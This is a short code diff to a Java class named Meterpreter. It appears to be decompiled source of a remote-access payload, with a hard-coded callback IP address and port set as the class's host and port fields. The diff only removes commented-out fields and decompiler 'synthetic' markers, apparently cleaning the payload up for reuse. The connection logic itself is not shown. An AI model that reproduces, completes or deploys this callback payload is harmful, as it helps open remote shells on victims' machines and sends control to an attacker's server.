@@ -14,11 +14,10 @@ public class Meterpreter
         implements Runnable {
     public static          String  host = "111.229.10.212";
     public static          String  port = "23412";
-    //public                 String  host;
-    //public                 String  port;
-    static /* synthetic */ Class   class$0;
-    static /* synthetic */ Class   class$1;
-    static /* synthetic */ Class   class$2;
+
+    static  Class   class$0;
+    static  Class   class$1;
+    static  Class   class$2;
 
     static {
 
